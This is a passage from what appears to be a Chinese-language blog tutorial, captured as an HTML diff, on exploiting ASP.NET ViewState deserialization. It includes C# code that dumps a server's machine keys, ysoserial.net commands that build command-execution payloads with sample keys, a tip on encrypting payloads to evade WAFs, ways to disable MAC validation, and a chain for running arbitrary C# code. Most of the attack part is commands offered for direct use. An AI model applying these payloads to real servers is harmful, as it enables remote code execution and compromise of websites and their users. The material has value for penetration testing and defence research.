+<span class="kt">byte</span><span class="p">[]</span> <span class="n">validationKeyAuto</span> <span class="p">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="p">[</span><span class="n">validationKeySize</span><span class="p">];</span>
+<span class="kt">byte</span><span class="p">[]</span> <span class="n">decryptionKeyAuto</span> <span class="p">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="p">[</span><span class="n">decryptionKeySize</span><span class="p">];</span>
+<span class="n">System</span><span class="p">.</span><span class="n">Buffer</span><span class="p">.</span><span class="n">BlockCopy</span><span class="p">(</span><span class="n">autogenKeys</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="n">validationKeyAuto</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="n">validationKeySize</span><span class="p">);</span>
+<span class="n">System</span><span class="p">.</span><span class="n">Buffer</span><span class="p">.</span><span class="n">BlockCopy</span><span class="p">(</span><span class="n">autogenKeys</span><span class="p">,</span> <span class="n">validationKeySize</span><span class="p">,</span> <span class="n">decryptionKeyAuto</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="n">decryptionKeySize</span><span class="p">);</span>
+<span class="kt">string</span> <span class="n">appName</span> <span class="p">=</span> <span class="n">HttpRuntime</span><span class="p">.</span><span class="n">AppDomainAppVirtualPath</span><span class="p">;</span>
+<span class="kt">string</span> <span class="n">appId</span> <span class="p">=</span> <span class="n">HttpRuntime</span><span class="p">.</span><span class="n">AppDomainAppId</span><span class="p">;</span>
+<span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;br/&gt;&#34;</span><span class="p">);</span>
+<span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;b&gt;appName:&lt;/b&gt; &#34;</span><span class="p">+</span><span class="n">appName</span><span class="p">);</span>
+<span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;br/&gt;&#34;</span><span class="p">);</span>
+<span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;b&gt;appId:&lt;/b&gt; &#34;</span><span class="p">+</span><span class="n">appId</span><span class="p">);</span>
+<span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;br/&gt;&#34;</span><span class="p">);</span>
+<span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;b&gt;initial validationKey (not useful for direct use):&lt;/b&gt; &#34;</span><span class="p">);</span>
+<span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="n">BitConverter</span><span class="p">.</span><span class="n">ToString</span><span class="p">(</span><span class="n">validationKeyAuto</span><span class="p">).</span><span class="n">Replace</span><span class="p">(</span><span class="s">&#34;-&#34;</span><span class="p">,</span> <span class="kt">string</span><span class="p">.</span><span class="n">Empty</span><span class="p">));</span>
+<span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;br/&gt;&#34;</span><span class="p">);</span>
+<span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;b&gt;initial decryptionKey (not useful for direct use):&lt;/b&gt; &#34;</span><span class="p">);</span>
+<span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="n">BitConverter</span><span class="p">.</span><span class="n">ToString</span><span class="p">(</span><span class="n">decryptionKeyAuto</span><span class="p">).</span><span class="n">Replace</span><span class="p">(</span><span class="s">&#34;-&#34;</span><span class="p">,</span> <span class="kt">string</span><span class="p">.</span><span class="n">Empty</span><span class="p">));</span>
+<span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;br/&gt;&#34;</span><span class="p">);</span>
+<span class="kt">byte</span><span class="p">[]</span> <span class="m">_</span><span class="n">validationKeyAutoAppSpecific</span> <span class="p">=</span> <span class="n">validationKeyAuto</span><span class="p">.</span><span class="n">ToArray</span><span class="p">();</span>
+<span class="kt">int</span> <span class="n">dwCode3</span> <span class="p">=</span> <span class="n">StringComparer</span><span class="p">.</span><span class="n">InvariantCultureIgnoreCase</span><span class="p">.</span><span class="n">GetHashCode</span><span class="p">(</span><span class="n">appName</span><span class="p">);</span>
+<span class="m">_</span><span class="n">validationKeyAutoAppSpecific</span><span class="p">[</span><span class="m">0</span><span class="p">]</span> <span class="p">=</span> <span class="p">(</span><span class="kt">byte</span><span class="p">)(</span><span class="n">dwCode3</span> <span class="p">&amp;</span> <span class="m">0xff</span><span class="p">);</span>
+<span class="m">_</span><span class="n">validationKeyAutoAppSpecific</span><span class="p">[</span><span class="m">1</span><span class="p">]</span> <span class="p">=</span> <span class="p">(</span><span class="kt">byte</span><span class="p">)((</span><span class="n">dwCode3</span> <span class="p">&amp;</span> <span class="m">0xff00</span><span class="p">)</span> <span class="p">&gt;&gt;</span> <span class="m">8</span><span class="p">);</span>
+<span class="m">_</span><span class="n">validationKeyAutoAppSpecific</span><span class="p">[</span><span class="m">2</span><span class="p">]</span> <span class="p">=</span> <span class="p">(</span><span class="kt">byte</span><span class="p">)((</span><span class="n">dwCode3</span> <span class="p">&amp;</span> <span class="m">0xff0000</span><span class="p">)</span> <span class="p">&gt;&gt;</span> <span class="m">16</span><span class="p">);</span>
+<span class="m">_</span><span class="n">validationKeyAutoAppSpecific</span><span class="p">[</span><span class="m">3</span><span class="p">]</span> <span class="p">=</span> <span class="p">(</span><span class="kt">byte</span><span class="p">)((</span><span class="n">dwCode3</span> <span class="p">&amp;</span> <span class="m">0xff000000</span><span class="p">)</span> <span class="p">&gt;&gt;</span> <span class="m">24</span><span class="p">);</span>
+<span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;b&gt;App specific ValidationKey (when uses IsolateApps):&lt;/b&gt; &#34;</span><span class="p">);</span>
+<span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="n">BitConverter</span><span class="p">.</span><span class="n">ToString</span><span class="p">(</span><span class="m">_</span><span class="n">validationKeyAutoAppSpecific</span><span class="p">).</span><span class="n">Replace</span><span class="p">(</span><span class="s">&#34;-&#34;</span><span class="p">,</span> <span class="kt">string</span><span class="p">.</span><span class="n">Empty</span><span class="p">));</span>
+<span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;br/&gt;&#34;</span><span class="p">);</span>
+<span class="kt">byte</span><span class="p">[]</span> <span class="m">_</span><span class="n">validationKeyAutoAppIdSpecific</span> <span class="p">=</span> <span class="n">validationKeyAuto</span><span class="p">.</span><span class="n">ToArray</span><span class="p">();</span>
+<span class="kt">int</span> <span class="n">dwCode4</span> <span class="p">=</span> <span class="n">StringComparer</span><span class="p">.</span><span class="n">InvariantCultureIgnoreCase</span><span class="p">.</span><span class="n">GetHashCode</span><span class="p">(</span><span class="n">appId</span><span class="p">);</span>
+<span class="m">_</span><span class="n">validationKeyAutoAppIdSpecific</span><span class="p">[</span><span class="m">4</span><span class="p">]</span> <span class="p">=</span> <span class="p">(</span><span class="kt">byte</span><span class="p">)(</span><span class="n">dwCode4</span> <span class="p">&amp;</span> <span class="m">0xff</span><span class="p">);</span>
+<span class="m">_</span><span class="n">validationKeyAutoAppIdSpecific</span><span class="p">[</span><span class="m">5</span><span class="p">]</span> <span class="p">=</span> <span class="p">(</span><span class="kt">byte</span><span class="p">)((</span><span class="n">dwCode4</span> <span class="p">&amp;</span> <span class="m">0xff00</span><span class="p">)</span> <span class="p">&gt;&gt;</span> <span class="m">8</span><span class="p">);</span>
+<span class="m">_</span><span class="n">validationKeyAutoAppIdSpecific</span><span class="p">[</span><span class="m">6</span><span class="p">]</span> <span class="p">=</span> <span class="p">(</span><span class="kt">byte</span><span class="p">)((</span><span class="n">dwCode4</span> <span class="p">&amp;</span> <span class="m">0xff0000</span><span class="p">)</span> <span class="p">&gt;&gt;</span> <span class="m">16</span><span class="p">);</span>
+<span class="m">_</span><span class="n">validationKeyAutoAppIdSpecific</span><span class="p">[</span><span class="m">7</span><span class="p">]</span> <span class="p">=</span> <span class="p">(</span><span class="kt">byte</span><span class="p">)((</span><span class="n">dwCode4</span> <span class="p">&amp;</span> <span class="m">0xff000000</span><span class="p">)</span> <span class="p">&gt;&gt;</span> <span class="m">24</span><span class="p">);</span>
+<span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;b&gt;AppId Auto specific ValidationKey (when uses IsolateByAppId):&lt;/b&gt; &#34;</span><span class="p">);</span>
+<span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="n">BitConverter</span><span class="p">.</span><span class="n">ToString</span><span class="p">(</span><span class="m">_</span><span class="n">validationKeyAutoAppIdSpecific</span><span class="p">).</span><span class="n">Replace</span><span class="p">(</span><span class="s">&#34;-&#34;</span><span class="p">,</span> <span class="kt">string</span><span class="p">.</span><span class="n">Empty</span><span class="p">));</span>
+<span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;br/&gt;&#34;</span><span class="p">);</span>
+<span class="kt">byte</span><span class="p">[]</span> <span class="m">_d</span><span class="n">ecryptionKeyAutoAutoAppSpecific</span> <span class="p">=</span> <span class="n">decryptionKeyAuto</span><span class="p">.</span><span class="n">ToArray</span><span class="p">();</span>
+<span class="c1">//int dwCode3 = StringComparer.InvariantCultureIgnoreCase.GetHashCode(appName);
+</span><span class="c1"></span><span class="m">_d</span><span class="n">ecryptionKeyAutoAutoAppSpecific</span><span class="p">[</span><span class="m">0</span><span class="p">]</span> <span class="p">=</span> <span class="p">(</span><span class="kt">byte</span><span class="p">)(</span><span class="n">dwCode3</span> <span class="p">&amp;</span> <span class="m">0xff</span><span class="p">);</span>
+<span class="m">_d</span><span class="n">ecryptionKeyAutoAutoAppSpecific</span><span class="p">[</span><span class="m">1</span><span class="p">]</span> <span class="p">=</span> <span class="p">(</span><span class="kt">byte</span><span class="p">)((</span><span class="n">dwCode3</span> <span class="p">&amp;</span> <span class="m">0xff00</span><span class="p">)</span> <span class="p">&gt;&gt;</span> <span class="m">8</span><span class="p">);</span>
+<span class="m">_d</span><span class="n">ecryptionKeyAutoAutoAppSpecific</span><span class="p">[</span><span class="m">2</span><span class="p">]</span> <span class="p">=</span> <span class="p">(</span><span class="kt">byte</span><span class="p">)((</span><span class="n">dwCode3</span> <span class="p">&amp;</span> <span class="m">0xff0000</span><span class="p">)</span> <span class="p">&gt;&gt;</span> <span class="m">16</span><span class="p">);</span>
+<span class="m">_d</span><span class="n">ecryptionKeyAutoAutoAppSpecific</span><span class="p">[</span><span class="m">3</span><span class="p">]</span> <span class="p">=</span> <span class="p">(</span><span class="kt">byte</span><span class="p">)((</span><span class="n">dwCode3</span> <span class="p">&amp;</span> <span class="m">0xff000000</span><span class="p">)</span> <span class="p">&gt;&gt;</span> <span class="m">24</span><span class="p">);</span>
+<span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;b&gt;App specific DecryptionKey (when uses IsolateApps):&lt;/b&gt; &#34;</span><span class="p">);</span>
+<span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="n">BitConverter</span><span class="p">.</span><span class="n">ToString</span><span class="p">(</span><span class="m">_d</span><span class="n">ecryptionKeyAutoAutoAppSpecific</span><span class="p">).</span><span class="n">Replace</span><span class="p">(</span><span class="s">&#34;-&#34;</span><span class="p">,</span> <span class="kt">string</span><span class="p">.</span><span class="n">Empty</span><span class="p">));</span>
+<span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;br/&gt;&#34;</span><span class="p">);</span>
+<span class="kt">byte</span><span class="p">[]</span> <span class="m">_d</span><span class="n">ecryptionKeyAutoAutoAppIdSpecific</span> <span class="p">=</span> <span class="n">decryptionKeyAuto</span><span class="p">.</span><span class="n">ToArray</span><span class="p">();</span>
+<span class="c1">//int dwCode4 = StringComparer.InvariantCultureIgnoreCase.GetHashCode(appId);
+</span><span class="c1"></span><span class="m">_d</span><span class="n">ecryptionKeyAutoAutoAppIdSpecific</span><span class="p">[</span><span class="m">4</span><span class="p">]</span> <span class="p">=</span> <span class="p">(</span><span class="kt">byte</span><span class="p">)(</span><span class="n">dwCode4</span> <span class="p">&amp;</span> <span class="m">0xff</span><span class="p">);</span>
+<span class="m">_d</span><span class="n">ecryptionKeyAutoAutoAppIdSpecific</span><span class="p">[</span><span class="m">5</span><span class="p">]</span> <span class="p">=</span> <span class="p">(</span><span class="kt">byte</span><span class="p">)((</span><span class="n">dwCode4</span> <span class="p">&amp;</span> <span class="m">0xff00</span><span class="p">)</span> <span class="p">&gt;&gt;</span> <span class="m">8</span><span class="p">);</span>
+<span class="m">_d</span><span class="n">ecryptionKeyAutoAutoAppIdSpecific</span><span class="p">[</span><span class="m">6</span><span class="p">]</span> <span class="p">=</span> <span class="p">(</span><span class="kt">byte</span><span class="p">)((</span><span class="n">dwCode4</span> <span class="p">&amp;</span> <span class="m">0xff0000</span><span class="p">)</span> <span class="p">&gt;&gt;</span> <span class="m">16</span><span class="p">);</span>
+<span class="m">_d</span><span class="n">ecryptionKeyAutoAutoAppIdSpecific</span><span class="p">[</span><span class="m">7</span><span class="p">]</span> <span class="p">=</span> <span class="p">(</span><span class="kt">byte</span><span class="p">)((</span><span class="n">dwCode4</span> <span class="p">&amp;</span> <span class="m">0xff000000</span><span class="p">)</span> <span class="p">&gt;&gt;</span> <span class="m">24</span><span class="p">);</span>
+<span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;b&gt;AppId Auto specific DecryptionKey (when uses IsolateByAppId):&lt;/b&gt; &#34;</span><span class="p">);</span>
+<span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="n">BitConverter</span><span class="p">.</span><span class="n">ToString</span><span class="p">(</span><span class="m">_d</span><span class="n">ecryptionKeyAutoAutoAppIdSpecific</span><span class="p">).</span><span class="n">Replace</span><span class="p">(</span><span class="s">&#34;-&#34;</span><span class="p">,</span> <span class="kt">string</span><span class="p">.</span><span class="n">Empty</span><span class="p">));</span>
+<span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;br/&gt;&#34;</span><span class="p">);</span>
+<span class="p">%&gt;</span>
+</code></pre></td></tr></table></div>
+</div>
+</div></li>
+</ol>
+<h2 id="payload-利用"><a href="#payload-利用" class="anchor-link">#</a><a href="#contents:payload-利用" class="headings">Payload 利用</a></h2>
+<p>生成ViewState需要禁用MAC验证或在（ASP.NET 4.0及以前版本知道验证密钥及其算法，ASP.NET 4.5及以后知道验证密钥、验证算法、解密密钥和解密算法）。</p>
+<p><strong>Tips:</strong> 即使目标从HTTP请求中删除了ViewState，也不影响利用，添加ViewState参数依旧会解析。</p>
+<p><a href="https://github.com/pwntester/ysoserial.net" target="_blank" rel="noopener">ysoserial.net</a></p>
+<ol>
+<li>
+<p><strong>ASP.NET 4.0及以下（不需要指定decryptionKey及其算法）</strong></p>
+<p>执行命令</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c">#知道generator就用--generator指定，就不用--apppath和--path参数了</span>
+<span class="n">ysoserial</span><span class="p">.</span><span class="n">exe</span> <span class="n">-p</span> <span class="n">ViewState</span> <span class="n">-g</span> <span class="n">TypeConfuseDelegate</span> <span class="n">-c</span> <span class="s2">&#34;echo 123 &gt; C:\windows\temp\ss.txt&#34;</span> <span class="p">-</span><span class="n">-validationalg</span><span class="p">=</span><span class="s2">&#34;HMACSHA256&#34;</span> <span class="p">-</span><span class="n">-validationkey</span><span class="p">=</span><span class="s2">&#34;B298BA4E89C9631254E60F7C6E60B3287554B5175906E3CF8C446D9D5EAB496CEA7C76460CBC3095A7ABFC9C71BBE7CA5276CD412BE2F5F142C0F7624062734E&#34;</span> <span class="p">-</span><span class="n">-apppath</span><span class="p">=</span><span class="s2">&#34;/&#34;</span> <span class="p">-</span><span class="n">-path</span><span class="p">=</span><span class="s2">&#34;/test.aspx&#34;</span> <span class="p">-</span><span class="n">-islegacy</span> <span class="p">-</span><span class="n">-isdebug</span>
+<span class="c">#--isencrypted参数可以加密__VIEWSTATE参数以绕过WAF</span>
+<span class="c">#使用加密需要指定decryptionkey，并且在post请求中添加：__VIEWSTATEENCRYPTED=true参数</span>
+<span class="n">ysoserial</span><span class="p">.</span><span class="n">exe</span> <span class="n">-p</span> <span class="n">ViewState</span> <span class="n">-g</span> <span class="n">TypeConfuseDelegate</span> <span class="n">-c</span> <span class="s2">&#34;echo 123 &gt; C:\windows\temp\ss.txt&#34;</span> <span class="p">-</span><span class="n">-validationalg</span><span class="p">=</span><span class="s2">&#34;SHA1&#34;</span> <span class="p">-</span><span class="n">-validationkey</span><span class="p">=</span><span class="s2">&#34;B298BA4EFAF9568A702CECFE5C138BA1939E726D2DDE65EFBF940AA2A51BB580F6A4FAFB75B152F849C38B6417E9D2193737DA22D7AF63E210BF0FC37569CB53&#34;</span> <span class="p">-</span><span class="n">-decryptionalg</span><span class="p">=</span><span class="s2">&#34;AES&#34;</span> <span class="p">-</span><span class="n">-decryptionkey</span><span class="p">=</span><span class="s2">&#34;B298BA4EB3474EAE783D6A3295021698ECB183CDC9D407F1&#34;</span> <span class="p">-</span><span class="n">-apppath</span><span class="p">=</span><span class="s2">&#34;/&#34;</span> <span class="p">-</span><span class="n">-path</span><span class="p">=</span><span class="s2">&#34;/test.aspx&#34;</span> <span class="p">-</span><span class="n">-islegacy</span> <span class="p">-</span><span class="n">-isdebug</span> <span class="p">-</span><span class="n">-isencrypted</span>
+</code></pre></td></tr></table></div>
+</div>
+</div></li>
+<li>
+<p><strong>ASP.NET 4.5及以上</strong></p>
+<p>执行命令</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">ysoserial</span><span class="p">.</span><span class="n">exe</span> <span class="n">-p</span> <span class="n">ViewState</span> <span class="n">-g</span> <span class="n">TextFormattingRunProperties</span> <span class="n">-c</span> <span class="s2">&#34;echo 123 &gt; C:\windows\temp\ss.txt&#34;</span> <span class="p">-</span><span class="n">-path</span><span class="p">=</span><span class="s2">&#34;/test.aspx&#34;</span> <span class="p">-</span><span class="n">-apppath</span><span class="p">=</span><span class="s2">&#34;/&#34;</span> <span class="p">-</span><span class="n">-decryptionalg</span><span class="p">=</span><span class="s2">&#34;AES&#34;</span> <span class="p">-</span><span class="n">-decryptionkey</span><span class="p">=</span><span class="s2">&#34;3CEA67326F7D94ED9420C9686CEC65320EEA136215EE2A15&#34;</span> <span class="p">-</span><span class="n">-validationalg</span><span class="p">=</span><span class="s2">&#34;HMACSHA256&#34;</span> <span class="p">-</span><span class="n">-validationkey</span><span class="p">=</span><span class="s2">&#34;80A244313D442AFC027753337BC66F106E617EB5D56B540CEAF9595272002C4B&#34;</span>
+</code></pre></td></tr></table></div>
+</div>
+</div></li>
+<li>
+<p><strong>禁用MAC验证的情况下利用</strong></p>
+<p>判断是否被禁用: 发送 <code>__VIEWSTATE=AAAA</code> 如果被没被禁用是会有MAC的报错的，但具体视实际情况而定。</p>
+<p><code>ysoserial.exe -o base64 -g TypeConfuseDelegate -f LosFormatter -c &quot;echo 123 &gt; C:\inetpub\wwwroot\ss2.txt&quot;</code></p>
+<p>禁用MAC的方法：</p>
+<ul>
+<li>
+<p>在未打补丁的机器，直接web.config配置</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+<span class="nt">&lt;configuration&gt;</span>
+<span class="nt">&lt;system.web&gt;</span>
+<span class="nt">&lt;customErrors</span> <span class="na">mode=</span><span class="s">&#34;Off&#34;</span> <span class="nt">/&gt;</span>
+<span class="nt">&lt;pages</span> <span class="na">enableViewStateMac=</span><span class="s">&#34;false&#34;</span> <span class="nt">/&gt;</span>
+<span class="nt">&lt;/system.web&gt;</span>
+<span class="nt">&lt;/configuration&gt;</span>
+</code></pre></td></tr></table></div>
+</div>
+</div></li>
+<li>
+<p>打了补丁的机器，可以通过注册表禁用</p>
+<p><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework\v{VersionHere}</code></p>
+<p>添加AspNetEnforceViewStateMac的值为0（重启生效）</p>
+</li>
+</ul>
+</li>
+</ol>
+<p>在有ViewStateUserKey的情况下：</p>
+<p>ViewStateUserKey 属性可用于抵御 CSRF 攻击。如果目标配置了ViewStateUserKey，那么需要将<code>--viewstateuserkey</code>参数传递给ysoserial 生成Payload，不然是不会执行payload的。</p>
+<h2 id="反序列化执行代码"><a href="#反序列化执行代码" class="anchor-link">#</a><a href="#contents:反序列化执行代码" class="headings">反序列化执行代码</a></h2>
+<p>如果要用ActivitySurrogateSelectorFromFile链执行代码，且目标在ASP.NET 4.8以上，需要先DisableTypeCheck。不然直接用这条链打的话，会报state到Pair的转换错误。</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">ysoserial</span><span class="p">.</span><span class="n">exe</span> <span class="n">-p</span> <span class="n">ViewState</span> <span class="n">-g</span> <span class="n">ActivitySurrogateDisableTypeCheck</span> <span class="n">-c</span> <span class="s2">&#34;aaa&#34;</span> <span class="p">-</span><span class="n">-validationalg</span><span class="p">=</span><span class="s2">&#34;HMACSHA256&#34;</span> <span class="p">-</span><span class="n">-validationkey</span><span class="p">=</span><span class="s2">&#34;B298BA4E89C9631254E60F7C6E60B3287554B5175906E3CF8C446D9D5EAB496CEA7C76460CBC3095A7ABFC9C71BBE7CA5276CD412BE2F5F142C0F7624062734E&#34;</span> <span class="p">-</span><span class="n">-generator</span><span class="p">=</span><span class="s2">&#34;5F3023B1&#34;</span> <span class="p">-</span><span class="n">-decryptionalg</span><span class="p">=</span><span class="s2">&#34;AES&#34;</span> <span class="p">-</span><span class="n">-decryptionkey</span><span class="p">=</span><span class="s2">&#34;B298BA4EB3474EAE783D6A3295021698ECB183CDC9D407F1&#34;</span> <span class="p">-</span><span class="n">-islegacy</span> <span class="p">-</span><span class="n">-isdebug</span> <span class="p">-</span><span class="n">-isencrypted</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><p>然后再利用ActivitySurrogateSelectorFromFile链执行代码。在code.cs中，写一个类（把需要执行的代码写在构造函数或者静态代码块中）反序列化时会实例化该类。</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">ysoserial</span><span class="p">.</span><span class="n">exe</span> <span class="n">-p</span> <span class="n">ViewState</span> <span class="n">-g</span> <span class="n">ActivitySurrogateSelectorFromFile</span> <span class="n">-c</span> <span class="s2">&#34;code.cs;System.Web.dll;System.dll;&#34;</span> <span class="p">-</span><span class="n">-validationalg</span><span class="p">=</span><span class="s2">&#34;HMACSHA256&#34;</span> <span class="p">-</span><span class="n">-validationkey</span><span class="p">=</span><span class="s2">&#34;B298BA4E89C9631254E60F7C6E60B3287554B5175906E3CF8C446D9D5EAB496CEA7C76460CBC3095A7ABFC9C71BBE7CA5276CD412BE2F5F142C0F7624062734E&#34;</span> <span class="p">-</span><span class="n">-generator</span><span class="p">=</span><span class="s2">&#34;5F3023B1&#34;</span> <span class="p">-</span><span class="n">-decryptionalg</span><span class="p">=</span><span class="s2">&#34;AES&#34;</span> <span class="p">-</span><span class="n">-decryptionkey</span><span class="p">=</span><span class="s2">&#34;B298BA4EB3474EAE783D6A3295021698ECB183CDC9D407F1&#34;</span> <span class="p">-</span><span class="n">-islegacy</span> <span class="p">-</span><span class="n">-isdebug</span> <span class="p">-</span><span class="n">-isencrypted</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><h2 id="测试代码"><a href="#测试代码" class="anchor-link">#</a><a href="#contents:测试代码" class="headings">测试代码</a></h2>
+<p><strong>Tips:</strong> 测试的时候切换到ASP.NET 4.5，在Web.config 中配置<code>&lt;httpRuntime targetFramework=&quot;4.5&quot; /&gt;</code></p>
+<p>test.aspx</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-vbnet" data-lang="vbnet"><span class="na">&lt;%@ Page Language=&#34;C#&#34; AutoEventWireup=&#34;true&#34; CodeFile=&#34;hello.aspx.cs&#34; Inherits=&#34;hello&#34; %&gt;</span>
+<span class="na">&lt;!DOCTYPE html&gt;</span>
+<span class="na">&lt;html xmlns=&#34;http://www.w3.org/1999/xhtml&#34;&gt;</span>
+<span class="na">&lt;head runat=&#34;server&#34;&gt;</span>
+    <span class="o">&lt;</span><span class="n">title</span><span class="o">&gt;&lt;/</span><span class="n">title</span><span class="o">&gt;</span>
+<span class="na">&lt;/head&gt;</span>
+<span class="na">&lt;body&gt;</span>
+    <span class="o">&lt;</span><span class="n">form</span> <span class="n">id</span><span class="o">=</span><span class="s">&#34;form1&#34;</span> <span class="n">runat</span><span class="o">=</span><span class="s">&#34;server&#34;</span><span class="o">&gt;</span>
+        <span class="o">&lt;</span><span class="n">asp</span><span class="p">:</span><span class="n">TextBox</span> <span class="n">id</span><span class="o">=</span><span class="s">&#34;TextArea1&#34;</span> <span class="n">TextMode</span><span class="o">=</span><span class="s">&#34;multiline&#34;</span> <span class="n">Columns</span><span class="o">=</span><span class="s">&#34;50&#34;</span> <span class="n">Rows</span><span class="o">=</span><span class="s">&#34;5&#34;</span> <span class="n">runat</span><span class="o">=</span><span class="s">&#34;server&#34;</span> <span class="o">/&gt;</span>
+        <span class="o">&lt;</span><span class="n">asp</span><span class="p">:</span><span class="n">Button</span> <span class="n">ID</span><span class="o">=</span><span class="s">&#34;Button1&#34;</span> <span class="n">runat</span><span class="o">=</span><span class="s">&#34;server&#34;</span> <span class="n">OnClick</span><span class="o">=</span><span class="s">&#34;Button1_Click&#34;</span>
+                 <span class="n">Text</span><span class="o">=</span><span class="s">&#34;GO&#34;</span> <span class="n">class</span><span class="o">=</span><span class="s">&#34;btn&#34;</span><span class="o">/&gt;</span>
+  <span class="o">&lt;</span><span class="n">br</span> <span class="o">/&gt;</span>
+        <span class="o">&lt;</span><span class="n">asp</span><span class="p">:</span><span class="n">Label</span> <span class="n">ID</span><span class="o">=</span><span class="s">&#34;Label1&#34;</span> <span class="n">runat</span><span class="o">=</span><span class="s">&#34;server&#34;</span><span class="o">&gt;&lt;/</span><span class="n">asp</span><span class="p">:</span><span class="n">Label</span><span class="o">&gt;</span>
+    <span class="o">&lt;/</span><span class="n">form</span><span class="o">&gt;</span>
+<span class="na">&lt;/body&gt;</span>
+<span class="na">&lt;/html&gt;</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><p>hello.aspx.cs</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="k">using</span> <span class="nn">System</span><span class="p">;</span>
+<span class="k">using</span> <span class="nn">System.Collections.Generic</span><span class="p">;</span>
+<span class="k">using</span> <span class="nn">System.Web</span><span class="p">;</span>
